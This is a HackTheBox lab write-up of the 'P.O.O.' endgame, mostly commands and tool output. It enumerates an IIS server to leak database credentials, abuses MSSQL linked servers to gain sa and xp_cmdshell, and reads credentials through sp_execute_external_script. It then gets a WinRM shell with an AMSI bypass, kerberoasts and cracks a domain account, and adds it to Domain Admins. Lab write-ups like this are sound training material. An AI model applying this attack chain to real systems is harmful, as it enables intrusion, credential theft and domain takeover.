---
description: P.O.O. endgame from HackTheBox write up.
---

# P.O.O.

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p-  --min-rate 1000 10.13.38.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 11:34 EDT
Nmap scan report for 10.13.38.11
Host is up (0.057s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 102.34 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p80,1433 10.13.38.11 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 11:42 EDT
Nmap scan report for 10.13.38.11
Host is up (0.057s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-ntlm-info: 
|   Target_Name: POO
|   NetBIOS_Domain_Name: POO
|   NetBIOS_Computer_Name: COMPATIBILITY
|   DNS_Domain_Name: intranet.poo
|   DNS_Computer_Name: COMPATIBILITY.intranet.poo
|   DNS_Tree_Name: intranet.poo
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-06-09T23:08:45
|_Not valid after:  2052-06-09T23:08:45
|_ssl-date: 2022-06-12T15:42:38+00:00; +7s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7s, deviation: 0s, median: 6s
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```

Only 2 ports open, a website (port 80) and a SQL server (port 1433). Let' start with the website.

## ISS server

After trying some wordlist to enumerate the web server, I found something interesting using a wordlist of file names:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.13.38.11/ -w Wordlists/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.38.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Wordlists/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/12 14:09:27 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 703]
/.ds_store            (Status: 200) [Size: 10244]
/iisstart.htm         (Status: 200) [Size: 703]  
/.trashes             (Status: 301) [Size: 151] [--> http://10.13.38.11/.trashes/]
===============================================================
2022/06/12 14:12:00 Finished
===============================================================
```

That `.ds_store` file can leak information about the contents in the directory, I found a little tool in Python to parse the file: [https://github.com/gehaxelt/Python-dsstore](https://github.com/gehaxelt/Python-dsstore){:target="_blank"}. It is a bit buggy and repeat files but hey, enough for me, these are the contents in the root directory:

```
Contents on /

admin
dev
iisstart.htm
Images
JS
META-INF
New folder
New folder (2)
Plugins
Templates
Themes
Uploads
web.config
Widgets
```

Looks like there are `.ds_store` files in every directory so time to enumerate:

```
Contents on /dev

304c0c90fbc6520610abbf378e2339d1
dca66d38fd916317687e1390a420c3fc
-------------------------------------------------
Contents on /dev/304c0c90fbc6520610abbf378e2339d1

core
db
include
src
-------------------------------------------------
Contents on /dev/dca66d38fd916317687e1390a420c3fc

core
db
include
src
```

Cool, I tried to bruteforce the files inside both `db` folders to check for credentials but no luck. After researching a bit I found something interesting in [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#old-iis-vulnerabilities-worth-looking-for){:target="_blank"}, if the server is vulnerable maybe we can get an idea an idea of how the filenames in every directory are called.

The tool suggested is in Java so I search for something in Python, I found this: [https://github.com/lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner){:target="_blank"}:

```bash
┌──(kali㉿kali)-[~/Desktop/poo/IIS_shortname_Scanner]
└─$ python2 iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db             
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

Ok! We now know that there is a file that starts by `poo_co` and the extention is `.txt`. Let's fuzz it! I took the only words starting with `co` from the `SecLists/Discovery/Web-Content/raft-large-words.txt` wordlist:

```bash
┌──(kali㉿kali)-[~/Desktop/poo]
└─$ wfuzz -w cutom_wordlist.txt --hs 404  http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt
Total requests: 2224

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000096:   200        6 L      7 W        142 Ch      "connection"                                       

Total time: 0
Processed Requests: 2224
Filtered Requests: 2223
Requests/sec.: 0
```

Visiting `http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_connection.txt` will show the `Recon` flag and also the credentials for the database:

```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#
```

## SQL server

I was able to connect to the SQL server:

```bash
┌──(venv)─(kali㉿kali)-[~/Desktop/poo]
└─$ mssql-cli -U external_user -P "#p00Public3xt3rnalUs3r#" -S 10.13.38.11,1433
master>
```

But I couldn't execute any command, I did some enumeration but I was not really lucky because the user has very limited permissions:

```sql
master> select name from sys.databases                                                                              
Time: 0.517s
+------------+
| name       |
|------------|
| master     |
| tempdb     |
| POO_PUBLIC |
+------------+
(3 rows affected)
master> SELECT * from INFORMATION_SCHEMA.TABLES                                                                     
Time: 0.513s
+-----------------+----------------+------------------+--------------+
| TABLE_CATALOG   | TABLE_SCHEMA   | TABLE_NAME       | TABLE_TYPE   |
|-----------------+----------------+------------------+--------------|
| master          | dbo            | spt_fallback_db  | BASE TABLE   |
| master          | dbo            | spt_fallback_dev | BASE TABLE   |
| master          | dbo            | spt_fallback_usg | BASE TABLE   |
| master          | dbo            | spt_values       | VIEW         |
| master          | dbo            | spt_monitor      | BASE TABLE   |
+-----------------+----------------+------------------+--------------+

master> SELECT name FROM syslogins;                                                                                 
Time: 0.506s
+---------------+
| name          |
|---------------|
| sa            |
| external_user |
+---------------+
(2 rows affected)

master> SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');                                 
Time: 0.588s
+---------------+-------------------+
| entity_name   | permission_name   |
|---------------+-------------------|
| server        | CONNECT SQL       |
+---------------+-------------------+
```

After researching a bit I found information about linked servers. Looks like you can setup external databases to extract data from, let's see if the server is using this feature:

```sql
master> EXECUTE sp_linkedservers                                                                                    
Time: 0.668s
+--------------------------+--------------------+---------------+--------------------------+----------------------+>
| SRV_NAME                 | SRV_PROVIDERNAME   | SRV_PRODUCT   | SRV_DATASOURCE           | SRV_PROVIDERSTRING   |>
|--------------------------+--------------------+---------------+--------------------------+----------------------+>
| COMPATIBILITY\POO_CONFIG | SQLNCLI            | SQL Server    | COMPATIBILITY\POO_CONFIG | NULL                 |>
| COMPATIBILITY\POO_PUBLIC | SQLNCLI            | SQL Server    | COMPATIBILITY\POO_PUBLIC | NULL                 |>
+--------------------------+--------------------+---------------+--------------------------+----------------------+>
(2 rows affected)

master> select @@servername                                                                                                                                     
Time: 0.666s
+--------------------------+
| (No column name)         |
|--------------------------|
| COMPATIBILITY\POO_PUBLIC |
+--------------------------+
(1 row affected)
```

Cool, so we have a SQL server linked (It shows 2 but one of them is the server we are in).

### RCE

I tried to execute some commands in the linked server:

```sql
master> EXECUTE ('select SUSER_NAME();') at [COMPATIBILITY\POO_CONFIG]                                                                                          
Time: 0.634s
+--------------------+
| (No column name)   |
|--------------------|
| internal_user      |
+--------------------+
(1 row affected)
```

We can see that the commands are being executed by `internal_user` in `COMPATIBILITY\POO_CONFIG`. I tried to connect to `COMPATIBILITY\POO_PUBLIC` through `COMPATIBILITY\POO_CONFIG` to see what user is executing the commands that way:

```sql
master> EXECUTE ('EXECUTE (''select SUSER_NAME();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG]                                              
Time: 0.608s
+--------------------+
| (No column name)   |
|--------------------|
| sa                 |
+--------------------+
(1 row affected)
```

Oh, that is nice. Looks like we can execute command as the `sa` user so maybe we can use `xp_cmdshell` now?

```
master> EXECUTE ('EXECUTE (''xp_cmdshell whoami'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG]                                                
Time: 0.849s
+-----------------------------+
| output                      |
|-----------------------------|
| nt service\mssql$poo_public |
| NULL                        |
+-----------------------------+
(2 rows affected)
```

Yeah we can! Also we have now access to a database called `flag`. You can guess what is in there right? Before following with the next steps I changed the `sa` user password to avoid the pivoting part and ease the commands syntax: 

```sql
master> EXECUTE ('EXECUTE (''ALTER LOGIN [sa] WITH PASSWORD=N''''idkwhat2puth3re.'''' '') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG]                                                                                      
Time: 0.322s
Commands completed successfully.
```

Now we are able to execute commands directly:

```bash
master> xp_cmdshell 'whoami'                                                                                                                                                                                                                 
Time: 1.213s (a second)
+-----------------------------+
| output                      |
|-----------------------------|
| nt service\mssql$poo_public |
| NULL                        |
+-----------------------------+
(2 rows affected)
```

### Privilege scalation

The user we can execute commands as is pretty limitted and we can't even get access to some of the important files in the webserver as `\inetput\wwwroot\web.config`. The thing is that looks like `sp_execute_external_script` is installed so maybe it is being executed as a different user:

```bash
master> EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'                                                                                                                        
Time: 8.474s (8 seconds)
STDOUT message(s) from external script: 

Express Edition will continue to be enforced.
POO_PUBLIC01
```

Confirmed, we can execute commands as the `POO_PUBLIC01` user. Now we can read the `web.config` file:

```sql
master> EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("type C:\\inetpub\wwwroot\web.config"))'                                                           
Time: 0.625s
STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>

```

With the credentials in there, I can access the `/admin` page and get another flag.

### Getting a shell

Right now we are stuck in the SQL server console, I tried some Python reverse shells but no luck. Maybe Im doing something wrong (Probably) or there is a firewall in place or something that avoid reverse shells to work. I checked the open ports in the machine:

```sql
master> xp_cmdshell 'ipconfig'                                                                                      
Time: 0.519s
+-----------------------------------------------------------------------+
| output                                                                |
|-----------------------------------------------------------------------|
| NULL                                                                  |
| Windows IP Configuration                                              |
| NULL                                                                  |
| NULL                                                                  |
| Ethernet adapter Ethernet1:                                           |
| NULL                                                                  |
|    Connection-specific DNS Suffix  . :                                |
|    IPv4 Address. . . . . . . . . . . : 172.20.128.101                 |
|    Subnet Mask . . . . . . . . . . . : 255.255.255.0                  |
|    Default Gateway . . . . . . . . . :                                |
| NULL                                                                  |
| Ethernet adapter Ethernet0:                                           |
| NULL                                                                  |
|    Connection-specific DNS Suffix  . : htb                            |
|    IPv6 Address. . . . . . . . . . . : dead:beef::250                 |
|    IPv6 Address. . . . . . . . . . . : dead:beef::1001                |
|    IPv6 Address. . . . . . . . . . . : dead:beef::f1f1:2ba7:c0ab:1b02 |
|    Link-local IPv6 Address . . . . . : fe80::f1f1:2ba7:c0ab:1b02%5    |
|    IPv4 Address. . . . . . . . . . . : 10.13.38.11                    |
|    Subnet Mask . . . . . . . . . . . : 255.255.255.0                  |
|    Default Gateway . . . . . . . . . : dead:beef::1                   |
|                                        fe80::250:56ff:feb9:1f8d%5     |
|                                        10.13.38.2                     |
| NULL                                                                  |
+-----------------------------------------------------------------------+
(24 rows affected)
master> xp_cmdshell 'netstat -ano'                                                                                  
Time: 0.538s
+-----------------------------------------------------------------------------+
| output                                                                      |
|-----------------------------------------------------------------------------|
| NULL                                                                        |
| Active Connections                                                          |
| NULL                                                                        |
|   Proto  Local Address          Foreign Address        State           PID  |
|   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4    |
|   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920  |
|   TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4    |
|   TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4828 |
|   TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4    |
|   TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4    |
|   TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       4804 |
|   TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4    |
|   TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488  |
|   TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1156 |
|   TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1636 |
|   TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       644  |
|   TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2368 |
|   TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       644  |
|   TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING       632  |
|   TCP    10.13.38.11:139        0.0.0.0:0              LISTENING       4    |
|   TCP    10.13.38.11:1433       10.10.14.3:35954       ESTABLISHED     4828 |
|   TCP    10.13.38.11:1433       10.10.14.3:41126       ESTABLISHED     4828 |
|   TCP    10.13.38.11:1433       10.10.14.3:41136       ESTABLISHED     4828 |
|   TCP    127.0.0.1:49679        0.0.0.0:0              LISTENING       4828 |
|   TCP    127.0.0.1:50280        0.0.0.0:0              LISTENING       4828 |
|   TCP    127.0.0.1:50311        0.0.0.0:0              LISTENING       4804 |
|   TCP    172.20.128.101:139     0.0.0.0:0              LISTENING       4    |
|   TCP    [::]:80                [::]:0                 LISTENING       4    |
|   TCP    [::]:135               [::]:0                 LISTENING       920  |
|   TCP    [::]:445               [::]:0                 LISTENING       4    |
|   TCP    [::]:1433              [::]:0                 LISTENING       4828 |
|   TCP    [::]:5357              [::]:0                 LISTENING       4    |
|   TCP    [::]:5985              [::]:0                 LISTENING       4    |
|   TCP    [::]:41433             [::]:0                 LISTENING       4804 |
|   TCP    [::]:47001             [::]:0                 LISTENING       4    |
|   TCP    [::]:49664             [::]:0                 LISTENING       488  |
|   TCP    [::]:49665             [::]:0                 LISTENING       1156 |
|   TCP    [::]:49666             [::]:0                 LISTENING       1636 |
|   TCP    [::]:49667             [::]:0                 LISTENING       644  |
|   TCP    [::]:49668             [::]:0                 LISTENING       2368 |
|   TCP    [::]:49669             [::]:0                 LISTENING       644  |
|   TCP    [::]:49680             [::]:0                 LISTENING       632  |
|   TCP    [::1]:50280            [::]:0                 LISTENING       4828 |
|   TCP    [::1]:50311            [::]:0                 LISTENING       4804 |
...
```

Wait, there are a lot of ports that were not reported by Nmap because are open in IPV6. One of those ports is 5985 what normally is WinRM. Maybe we can connect to it using the credentials we found in the `web.config` files?

I added the domain `COMPATIBILITY.intranet.poo` we got in the Nmap scan we did at the beginning to my `hosts` file. About the IP address I used for the domain, I had a little try and error moment because the `netstat` command resported more than one IPV6 address (`dead:beef::1001` was the good one):

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i COMPATIBILITY.intranet.poo -u Administrator -p EverybodyWantsToWorkAtP.O.O.

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

As you can see, I used the same credentials used for the admin panel. We can now get a new flag under `Administrator` desktop.

## p00ned

Time to enumerate the active directory, only one thing to keep in mind: 

```powershell
*Evil-WinRM* PS C:\Users\Public> whoami
compatibility\administrator
```

We can't query information about the domain from a local administrator account. However, the SQL is a service account and it can do it. The service accounts impersonate the computer account, which is member of the domain and we can consider it as a special type of user account.

Let's upload SharpHound to the machine, make sure you use `C:\Users\Public` directory to allow the SQL service account access the executable:

```powershell
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/poo/tools/BloodHound/Collectors/SharpHound.exe C:\Users\Public\s.exe
Info: Uploading /home/kali/Desktop/poo/tools/BloodHound/Collectors/SharpHound.exe to C:\Users\Public\s.exe

                                                             
Data: 1209000 bytes of 1209000 bytes copied

Info: Upload successful!
```

Cool, time to use the SQL shell again to execute SharpHound:

```sql
master> xp_cmdshell 'C:\Users\Public\s.exe -C All --outputdirectory C:\Users\Public'
```

After a while, the shell returns the command result and we are able to download the zip file with all the information we will need to find a good attack vector:

```powershell
*Evil-WinRM* PS C:\Users\Public> download C:\Users\Public\20220613043033_BloodHound.zip /home/kali/BloodHound.zip
Info: Downloading C:\Users\Public\20220613043033_BloodHound.zip to /home/kali/BloodHound.zip

                                                             
Info: Download successful!
```

We can now open Bloodhound and look for potential users than can lead us to domain admin. Luckily for us, this is not too hard:

<p align="center"><img alt="Screenshot with the BloodHound query result" src="/assets/images/HackTheBox/P.O.O./BloodHoundFinding.png"></p>

As you can see, the user `p00_adm` is a good candidate.

### ASREPRoasting

Maybe we can get a TGT of the user and crack its hash offline, we can use [Rubeus](https://github.com/GhostPack/Rubeus){:target="_blank"} for this. As we did before, upload the tool and then execute it using the SQL shell (Remember we are still in the local admin account):

```sql
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/poo/tools/Rubeus.exe C:\Users\Public\Rubeus.exe
Info: Uploading /home/kali/Desktop/poo/tools/Rubeus.exe to C:\Users\Public\Rubeus.exe

                                                             
Data: 574804 bytes of 574804 bytes copied

Info: Upload successful! 
```

```powershell
master> xp_cmdshell 'C:\Users\Public\Rubeus.exe kerberoast /user:p00_adm'
```

After executing the above, we are able to get the `p00_adm` password hash. At this point the obvious step is to crack it, the thing is that a typical dictionary as Rockyou won't work. I was able to get the job done with the wordlist `Keyboard-Combinations.txt` from SecLists:

```bash
┌──(kali㉿kali)-[~/Desktop/poo]
└─$ hashcat -a 0 hashes /home/kali/Wordlists/SecLists/Passwords/Keyboard-Combinations.txt --force
hashcat (v6.2.5) starting in autodetect mode

...

$krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443@intranet.poo*$b8814234e0701884db25071f34d6fdef$971246d033e9c1a9081851df54995ab4f7f59bef16050e13d3630ef5fa897bb9dafd2a4c31aad6b5fcf85b41cfa30d4fd687a2b1aac1cf634809679309556022fb162b062cccb81c5e6f6411c369016793954d668f46327b8e1539dd0d085edf30b597614f5e05af253961bc88e8f335a3ebed85e3a99c1f67b3abea703515b18e0e367c8786eaa11f0382a974f6566116da8ff29e9b4797262bd5716883f1e4bc8175c631a21f20d807c6290b45477e2326c7efb716220ecdc9119f845aa4a1564414686701b160387641dfd97fa409ef2237afd3c54bcecb8d9feb1300022b3c4e2bd50ac4143df41832c17e131bbb77e54a43e544da513d45df5d221335c0cd518cdac93fde4ccc01cc1f2b720f27ac6d0d9f2a28c6d818228a4b365c98ae724b3b00eacffb01b83854dd4a792de2e9a6e9ffe298c4f3be352fcf55ab2cc2ba13a55951ff6d53bbccdb9073c14d84160246da1dab50ff005c4bbc4481d7acdfe3fdc85a4da233d35167163a68319ec2290381180661286ac47561585d1d782b6606a055d0bc3b0869698429efe5c451bba4e9c026349512f889e8c2e799abdb894e797eb91c6f73471df73f8e20cdf1c2bfe421efde8e988d1b9b29d0485f8e87e89903ba729ea63a5e3d6bf0ad2a19c691d88511ecbaa63930b5bc60fc766ffbc3a88d4cf2e1aee3a05eb2c5f91097d98edd3ecdc9c5dd67e8255ddb36090a7532fa36409c464bb7fa930dac561df00c5e05c82ee0e8e178cf92e39dc58d4b6318aecbfd699e87c3dedee8c8c0e646a37ea2c91c0b2211a331dfda5e2d5398baa973202f63340efe661a05c708e182f01893452a05826d9ea11168c47ca2ad1e7b564a18d6ec534556d1eae4f75444e28d6c533216738f725a5dff5c03c843dde8ca55b8e22d6f37437c2677c8782acd3710536625cb82cf403085acf54e651719038149f14266db2ea1065ebae8c0f0bf3149a3a2997e391373f6cff68fe31ec572c280c1c06afbe7e27c1c62e8e9a42261d2093ac739b29c46e1fc9144319cf7daa8402eeeae5bcc08f73af3e8253d0af67d88853328ca1778cc7dbd1bbd9e693b48b3bec617ee931cb395f948737213fdaf487513b257e77881a99ef72d77db5d8c9b6f0465003bb10a912c9912151c67b6d9045251f0b50e83f2bc4abe3bd00f14ea75e2272cb3b645386b24890b557c1a4a9c7e46556756b48b46234c0c0de81cc6bb89d3ffb041d7680a64cd70dd3a11accbfedcbb5aed7dbde0057202480886a24870902b1cbea4b82a7b86ad7d5e2ca4312df4b80ba019d41b005e099f68ad3f28422f9d2725ae73bc49e1d3c44b8657c4195c9bc3a97655b94b8adfe7732049e05d8037b0965815da57adeb16a31a6c29bbf987b2e06e646411ed90b5d9078330708f0f6fa0c5d3620e6efdfb8a726b35a94b4fd98a257f015903d6a755ca38d62025576795db697e32fbf49cdde13149c72de09847c3:ZQ!5t4r
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intra...9847c3
Time.Started.....: Sun Jun 12 22:03:48 2022, (0 secs)
Time.Estimated...: Sun Jun 12 22:03:48 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/Wordlists/SecLists/Passwords/Keyboard-Combinations.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2911.0 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/9604 (42.65%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/9604 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: zaq1zaq1 -> ()+_T%R$
Hardware.Mon.#1..: Util: 11%

Started: Sun Jun 12 22:03:47 2022
Stopped: Sun Jun 12 22:03:50 2022
```


Cool, we have the credentials we needed to escalate to domain admin: `p00_adm:ZQ!5t4r`. In order to achieve our goal, I used [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1){:target="_blank"} to help with all the Active Directory related commands. Since Evil Winrm can load powershell scripts if you specify a path to load them from, integrating Powerview is pretty easy:

```powershell
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i COMPATIBILITY.intranet.poo -u Administrator -p EverybodyWantsToWorkAtP.O.O. -s /home/kali/Desktop/poo/tools 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\Users\Administrator\Documents> PowerView.ps1
```

In order to authenticate as `p00_adm` and do our stuff, we need to create a credential object first. Then, we can add ourselves to Domain Admins (`Add-DomainGroupMember` and `Get-DomainUser` commands are part of Powerview):

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> $pass= ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> $cred= New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainUser p00_adm -Credential $cred
...
serviceprincipalname          : cyber_audit/intranet.poo:443
memberof                      : {CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo, CN=Domain Admins,CN=Users,DC=intranet,DC=poo}
whencreated                   : 3/21/2018 7:07:23 PM
badpwdcount                   : 0
cn                            : p00_adm
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
...
```

As you can see, `p00_adm` is now a domain admin so we can now execute commands in the domain controller and obviously get the flag!

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami }
poo\p00_adm
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { type ..\..\mr3ks\Desktop\flag.txt }
```

